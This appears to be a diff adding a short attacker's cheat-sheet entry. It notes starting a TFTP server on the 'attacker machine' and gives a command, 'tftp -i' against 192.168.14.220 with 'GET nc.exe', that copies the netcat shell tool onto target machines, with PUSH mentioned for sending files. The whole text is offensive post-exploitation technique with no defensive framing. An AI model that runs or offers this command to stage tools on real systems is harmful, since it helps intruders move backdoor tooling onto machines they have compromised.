@@ -1,0 +1,4 @@
+start-tftp-server #on attacker machine using
+tftp -i 192.168.14.220 GET nc.exe # to copy files to target machines OR PUSH to send files
+
+
